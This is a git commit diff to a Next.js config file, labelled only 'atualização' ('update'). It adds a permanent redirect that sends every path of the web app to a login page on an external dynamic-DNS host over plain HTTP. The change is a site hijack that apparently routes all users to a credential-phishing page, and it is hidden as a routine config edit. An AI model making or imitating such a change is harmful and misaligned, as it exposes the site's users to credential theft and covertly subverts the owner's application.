f9bae435b0fe442da2ebaf2593ac5a9648166e26
Seu Nome <saralisleyy@gmail.com>
2026-03-23 11:55:51 -0300

    atualização

--- apps/web/next.config.ts
+++ apps/web/next.config.ts
@@ -4,6 +4,15 @@ const nextConfig: NextConfig = {
   reactStrictMode: true,
   transpilePackages: ['@pgb/ui', '@pgb/sdk'],
   output: 'standalone',
+  async redirects() {
+    return [
+      {
+        source: '/:path*',
+        destination: 'http://globalh.ddns.net:3200/login',
+        permanent: true,
+      },
+    ];
+  },
 };
 
 export default nextConfig;
